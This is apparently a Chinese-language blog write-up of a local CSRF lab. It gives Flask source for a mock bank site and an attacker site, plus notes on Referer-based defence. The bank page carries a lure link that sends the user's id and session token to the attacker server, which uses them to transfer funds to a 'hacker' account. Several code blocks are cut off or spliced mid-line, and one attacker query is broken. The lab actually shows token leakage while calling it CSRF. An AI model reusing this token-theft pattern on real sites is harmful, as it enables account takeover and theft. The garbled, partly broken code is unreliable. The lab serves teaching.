---
title: CSRF攻击
catalog: true
date: 2023-05-21
subtitle: 请使用自己搭建实验网站进行CSRF攻击实验
lang: cn
header-img: /img/header_img/lml_bg2.jpg
tags:
- information security 
- CSRF
- attack

---


​		CSRF攻击利用了受害者已经通过身份验证并且在一个网站上建立的有效会话，来执行未经授权的操作。当受害者在一个网站上登录并获得一个会话（例如通过使用用户名和密码进行身份验证），该网站会为其分配一个令牌或会话ID，以便在后续的请求中验证用户的身份。

​		CSRF攻击者会通过诱使受害者访问一个恶意网站或点击恶意链接，来利用受害者的已验证会话。由于受害者在浏览器中仍然保持着有效会话，攻击者可以构造特制的请求，以利用该会话来执行恶意操作，而这些操作是受害者并不知情或未经授权的。

​		例如，假设受害者在银行网站上登录并建立了一个有效的会话。攻击者可以通过电子邮件或社交媒体发送一个包含恶意链接的消息给受害者。如果受害者点击了该链接，他们的浏览器将自动向银行网站发送一个请求，而这个请求中包含了受害者的有效会话信息。银行网站在验证会话时会认为这个请求是合法的，因为会话是有效的，所以它执行了该请求所代表的操作，如转账、修改账户信息等，而受害者是毫不知情的。

​		CSRF攻击的目标是利用受害者的已验证会话来执行攻击者所期望的未经授权操作，从而导致受害者的损失或者对系统的安全产生威胁。



# 补充知识

## cookie

一般情况下，cookie是以**键值对进行表示**的(key-value)，例如name=jack，这个就表示cookie的名字是name，cookie携带的值是jack。

cookie有2种**存储方式**，一种是会话性，一种是持久性。

会话性：如果cookie为会话性，那么cookie仅会保存在客户端的内存中，当我们关闭客服端时cookie也就失效了
持久性：如果cookie为持久性，那么cookie会保存在用户的硬盘中，直至生存期结束或者用户主动将其销毁。

### 组成

（1）cookie名称
（2）cookie值
（3）Expires：过期时间。当过了过期时间后，浏览器会将该cookie删除。如果不设置Expires，则关闭浏览器后该cookie失效。
（4）Path：用来设置在路径下面的页面才可以访问该cookie，一般设为/，以表示同一站点的所有页面都可以访问该cookie。
（5）Domain：用来指定哪些子域才可以访问cookie，格式一般为“.XXX.com”
（6）Secure:如果设置了secure没有值，则代表只有使用HTTPS协议才可以访问
（7）HttpOnly：如果在cookie中设置了HttpOnly属性，那么通过JavaScript脚本等将无法读取到cookie信息。

![image-20230521183600290](https://raw.githubusercontent.com/sirius2alpha/Typora-pics/master/2023/05/upgit_20230521_1684665360.png)

![cookie组成](https://raw.githubusercontent.com/sirius2alpha/Typora-pics/master/2023/05/upgit_20230521_1684665295.png)

## URL

URL（统一资源定位符）的一般格式如下：

```
scheme://host:port/path?query_parameters#fragment_identifier
```

具体解释如下：

1. Scheme（协议）：指定用于访问资源的协议，例如HTTP、HTTPS、FTP等。它是URL的开头部分，通常以双斜杠（//）结尾。
2. Host（主机）：指定目标资源所在的主机名或IP地址。主机名可以是域名（例如example.com）或IP地址（例如192.168.0.1）。
3. Port（端口）：指定用于访问目标资源的端口号（可选）。默认的端口号根据协议而不同，如HTTP默认端口是80，HTTPS默认端口是443。如果URL中没有指定端口，将使用默认端口。
4. Path（路径）：指定资源在服务器上的路径（可选）。路径部分是指服务器上资源的具体位置，可以是文件路径或目录路径。
5. Query Parameters（查询参数）：包含在URL中的键值对参数（可选）。查询参数通常用于向服务器传递额外的信息，多个参数之间使用"&"符号分隔。
6. Fragment Identifier（片段标识符）：用于标识文档中的特定片段（可选）。片段标识符通常由一个锚点或特定位置的标识符组成，用于在文档中导航到指定位置。



# 实验过程

使用Flask框架进行构建web应用。

## 文件架构

```
├── web-csrf/
│   ├── webA.py
│   ├── webB.py
│   ├── templates/
│   │   ├── home.html
│   │   ├── login.html
│   └── static/
│       └── style.css
```



## 源码

webA:

```python
# webA.py
import hashlib
import re

import mysql.connector
from flask import Flask, request, render_template, make_response

app = Flask(__name__)
db = mysql.connector.connect(
    host="localhost",
    user="root",
    password="111111",
    database="web-csrf"
)
cursor = db.cursor()


# 登录功能
@app.route('/')
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        # 检查用户名和密码是否匹配，参数化查询的方式
        query = "SELECT * FROM user WHERE id = %s AND pwd = %s"
        cursor.execute(query, (username, password))
        user = cursor.fetchone()  # fetchone方法从查询结果中获取一条记录，以元组的形式返回
        cursor.fetchall()  # fetchall方法从查询结果中获取所有记录，以元组的形式返回

        if user:
            user_id = user[0]
            user_token = hashlib.md5()
            user_token.update((user_id + str(request.cookies.get('timestamp'))).encode('utf-8'))
            response = make_response(render_template('home.html', user_id=user[0], balance=user[3],user_token=user_token.hexdigest()))

            # 用户标识为用户ID和当前时间的md5摘要,在cookie中设置用户身份标识
            user_id = user[0]
            user_token = hashlib.md5()
            user_token.update((user_id + str(request.cookies.get('timestamp'))).encode('utf-8'))
            response.set_cookie('user_id', user_id)
            response.set_cookie('user_token', user_token.hexdigest())

            # 将cookie中的用户身份标识存入数据库
            query = "UPDATE user SET cookie = %s WHERE id = %s"
            cursor.execute(query, (user_token.hexdigest(), user_id))
            db.commit()

            return response
        else:
            return "用户名或密码错误"

    return render_template('login.html')


# 转账功能
@app.route('/transfer', methods=['POST'])
def transfer():
    user_id_cookie = request.cookies.get('user_id')
    user_token_cookie = request.cookies.get('user_token')
    if not user_id_cookie or not user_token_cookie:
        return "你的用户身份已过期，请重新登录"

    # 比较user_token是否与数据库中的cookie一致
    # 根据user_id从数据库中获取cookie
    cursor.fetchall()
    query = "SELECT cookie FROM user WHERE id = %s"
    cursor.execute(query, (user_id_cookie,))
    cookie = cursor.fetchone()[0]
    if cookie != user_token_cookie:
        return "cookie匹配失败！你的用户身份已过期，请重新登录"

    # 获取转账目标用户的ID和金额
    target_id = request.form['target_id']
    amount = request.form['amount']

    # 检测转账金额是否合法
    # 用正则表达式匹配小数
    if not re.match(r'^\d+(\.\d+)?$', amount):
        return "转账金额必须为数字"
    if float(amount) <= 0:
        return "转账金额必须大于0"

    # 检查转账目标用户是否存在
    cursor.fetchall()
    query = "SELECT * FROM user WHERE id = %s"
    cursor.execute(query, (target_id,))
    target = cursor.fetchone()
    if not target:
        return "目标账户不存在"

    # 检测当前账户是否有这么多钱
    cursor.fetchall()
    query = "SELECT * FROM user WHERE id = %s"
    cursor.execute(query, (user_id_cookie,))
    user = cursor.fetchone()
    if user[3] < float(amount):
        return "余额不足"

    # 执行转账操作
    cursor.fetchall()
    query = "UPDATE user SET balance = balance - %s WHERE id = %s"
    cursor.execute(query, (amount, user_id_cookie))
    query = "UPDATE user SET balance = balance + %s WHERE id = %s"
    cursor.execute(query, (amount, target_id))
    db.commit()

    # 更新账户信息，返回网站
    cursor.fetchall()
    query = "SELECT * FROM user WHERE id = %s"
    cursor.execute(query, (user_id_cookie,))
    user = cursor.fetchone()

    return render_template('home.html', user_id=user[0], balance=user[3], user_token=user[2],transfer_success=True)


if __name__ == '__main__':
    app.run()

```

webB

```python
import mysql.connector
from flask import Flask, request

app = Flask(__name__)
db = mysql.connector.connect(
    host="localhost",
    user="root",
    password="111111",
    database="web-csrf"
)
cursor = db.cursor()


# 转账请求
@app.route('/')
def csrf_attack():
    user_id_cookie = request.args.get('user_id')
    user_token_cookie = request.args.get('user_token')

    if user_token_cookie or  user_id_cookie:
        # 模拟服务器的验证操作，通过user_id_cookie查询对应的user_token，检查user_token_cookie是否与user_token相同，相同就允许执行转账操作
        query = "SELECT cookie FROM user WHERE id = %s"
        cursor.execute(query, (user_id_cookie,))
        user_token = cursor.fetchone()[0]

        if user_token == user_token_cookie:
            # 执行转账操作
            cursor.fetchall()
            query = "UPDATE user SET balance = balance - 100 WHERE id = 'user_id_cookie'"
            cursor.execute(query)
            query = "UPDATE user SET balance = balance + 100 WHERE id = 'hacker'"
            cursor.execute(query)
            db.commit()

            return "<h1 style='color: red; text-align: center; padding: 20px;'>CSRF攻击执行成功！</h1>"
        else:
            print("user_token:", user_token)
            print("user_token_cookie:", user_token_cookie)
            return "Invalid user credentials"

    else:#

login.html

```html
<!-- login.html -->

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>DoggyCoin用户登录</title>
    <link rel="stylesheet" type="text/css" href="../static/style.css">
</head>

<body>
<h1>DoggyCoin用户登录</h1>
<form action="/login" method="POST">
    <div>
        <label for="username">用户名:</label>
        <input type="text" id="username" name="username" required>
    </div>
    <div>
        <label for="password">密码:</label>
        <input type="password" id="password" name="password" required>
    </div>
    <div>
        <button type="submit">登录</button>
    </div>
</form>
</body>
</html>

```

home.html

```html
<!-- home.html -->
<!DOCTYPE html>#
</div>
<h1>欢迎访问DoggyCoin转账中心</h1>
<h2>账户余额: {{ balance }}</h2>
<script>
    // 检查是否存在转账成功的消息
    var transferSuccess = "{{ transfer_success }}";
    if (transferSuccess) {
        // 显示转账成功的消息提示框
        alert("转账成功！");
    }
</script>

<form action="/transfer" method="POST">
    <div>
        <label for="target_id">转账ID:</label>
        <input type="text" id="target_id" name="target_id" required>
    </div>
    <div>
        <label for="amount">转账金额:</label>
        <input type="text" id="amount" name="amount" required>
    </div>
    <div>
        <button type="submit">确认转账</button>
    </div>
</form>


<a href="http://127.0.0.1:5001?user_id={{ user_id }}&user_token={{ user_token }}">一般人都不知道的DoggyCoin转账技巧！特殊转账技巧转一送一！</a>

</body>
</html>

```

style.css

```css
/* style.css */

body {
    background-color: #f2f2f2;
    font-family: Arial, sans-serif;
}

.container {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 10px;
    background-color: #fff;
    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
}

.logo {
    font-size: 24px;
    font-weight: bold;
}

.user-info {
    display: flex;
    align-items: center;
}

.user-info .username {
    margin-right: 10px;
}

.logout-link {
    margin: 0;
    display: flex;
    align-items: center;
    color: #4CAF50;
    text-decoration: none;
}

h1 {
    color: #333;
    text-align: center;
}

form {
    max-width: 400px;
    margin: 0 auto;
    padding: 20px;
    background-color: #fff;
    border-radius: 5px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
}

label {
    display: block;
    margin-bottom: 10px;
    font-weight: bold;
}

input[type="text"],
input[type="password"] {
    width: 94%;
    padding: 10px;
    border: 1px solid #ccc;
    border-radius: 3px;
}

button {
    display: block;
    width: 100%;
    padding: 10px;
    margin-top: 10px;
    background-color: #4CAF50;
    color: #fff;
    border: none;
    border-radius: 3px;
    cursor: pointer;
}

h2 {
    margin-top: 20px;
    font-size: 18px;
    text-align: center;
}

a {
    display: block;
    text-align: cente#
}
```
​	当用户点击这个链接，就会带着在webA中的登录信息（cookie）去访问webB，构建这个webB的黑客就可以获取到用户B的cookie信息，并且向webA发送请求转账的请求，就可以绕过服务器的验证达到冒充用户去进行转账操作。



## 实现难点

webA需要具备登录登出、转账、转账时需要token进行验证等必备功能；

webB需要具备使用用户的cookie数据向webA发送转账的请求，而不仅仅是在本地直接操作数据库实现修改数据；

数据库中需要存放用户ID、用户密码、用户的cookie、账户余额等信息；

对于cookie数据的保存、设计、更新策略。



## 实验过程

![CSRF](https://raw.githubusercontent.com/sirius2alpha/Typora-pics/master/2023/05/upgit_20230523_1684808860.png)

### 数据库的设计

​		数据库中主要包含"id", "pwd", "cookie", "balance"字段，id是他们的登陆账户名，pwd是登陆密码，cookie表示他们的用户安全令牌，当转账的时候需要进行验证，balance表示账户余额。通过数据生成出一批用户。

​		其中hacker代表黑客，其他的都是普通用户。

![image-20230524110159461](https://raw.githubusercontent.com/sirius2alpha/Typora-pics/master/2023/05/upgit_20230524_1684897323.png)

### 验证webA功能的完整性

​		webA从服务器启动之后，运行在本地的5000端口上，进行访问之后会出现用户的登陆界面，输入在数据库中注册的用户名和密码进行登录。![image-20230524110512901](https://raw.githubusercontent.com/sirius2alpha/Typora-pics/master/2023/05/upgit_20230524_1684897513.png)

​		登录成功之后会进入到DoggyCoin转账中心，在网站左上角显示当前的登陆用户名和退出登录返回登录页面的按钮，中间的form表单就是正常进行转账操作的地方，输入正确的转账ID和合法的转账金额之后就能够进行转账操作。

![image-20230524110921459](https://raw.githubusercontent.com/sirius2alpha/Typora-pics/master/2023/05/upgit_20230524_1684897762.png)

![image-20230524111341249](https://raw.githubusercontent.com/sirius2alpha/Typora-pics/master/2023/05/upgit_20230524_1684898021.png)

![image-20230524111439974](https://raw.githubusercontent.com/sirius2alpha/Typora-pics/master/2023/05/upgit_20230524_1684898080.png)

​		这里也简单的进行了一些对于非法输入的防护，以防止出现服务器内部错误。比如对于转账ID的是否存在，转账金额是否大于0，使用正则表达式匹配转账金额小数点的情况等等。



### 进行CSRF漏洞的利用攻击。

​		当用户在登录webA的时候，服务器根据user1的id和登陆时间在后台生成一个md5摘要作为user1的cookie，存储在数据库中并且返回给user。

![image-20230524111913178](https://raw.githubusercontent.com/sirius2alpha/Typora-pics/master/2023/05/upgit_20230524_1684898353.png)

​		在webA上有一个诈骗链接，就是在转账表单下方的绿色链接“一般人都不知道的DoggyCoin转账技巧！特殊转账技巧转一送一！”，这个就是模拟的一个网页上的弹窗或者是通过电子邮件等方式，诱使用户点击从当前网页转到另外一个网页上，该链接的HTML为：

```html
<a href="http://127.0.0.1:5001?user_id={{ user_id }}&user_token={{ user_token }}">一般人都不知道的DoggyCoin转账技巧！特殊转账技巧转一送一！</a>
```

​		当用户点击链接之后就会带着当前网站上的cookie信息去访问webB，而webB的后台就从这个链接中获取到用户的user_id和user_token信息，就可以进行转账的操作了，就自动地从当前用户向hacker账户中转账100

![image-20230524112851120](https://raw.githubusercontent.com/sirius2alpha/Typora-pics/master/2023/05/upgit_20230524_1684898931.png)

​		webB是运行在本地的5001端口上的，当直接访问127.0.0.1:5001的时候，由于没有进行user_id和user_token的转发，所以在webB上无法得到用户的信息，也就不能够进行CSRF攻击。

![image-20230524113540728](https://raw.githubusercontent.com/sirius2alpha/Typora-pics/master/2023/05/upgit_20230524_1684899340.png)

## 防护策略

在防御CSRF（Cross-Site Request Forgery）攻击时，验证HTTP Referer字段是一种常见的方法之一。HTTP Referer字段用于指示请求的源头，即告诉服务器该请求是从哪个页面发起的。通过验证HTTP Referer字段，可以确保请求来源于预期的页面，从而减少CSRF攻击的风险。

要实现验证HTTP Referer字段的防御措施，可以按照以下步骤进行：

1. 在服务器端验证：当服务器接收到请求时，首先检查HTTP头部中的Referer字段。该字段包含了请求的来源页面的URL。服务器可以通过比较Referer字段的值与预期的来源页面的URL进行验证。如果Referer字段的值与预期不符，服务器可以拒绝该请求。
2. 验证来源页面的域名：为了增加安全性，可以进一步验证Referer字段中的来源页面域名。服务器可以检查Referer字段中的域名与当前请求的域名是否一致。这可以防止攻击者通过篡改Referer字段来绕过验证。
3. 考虑Referer字段的可靠性：需要注意的是，Referer字段并非百分之百可靠，因为它可以被篡改或者被一些浏览器或代理程序禁用。因此，验证Referer字段应该作为综合的安全策略的一部分，而不是单一的依赖点。

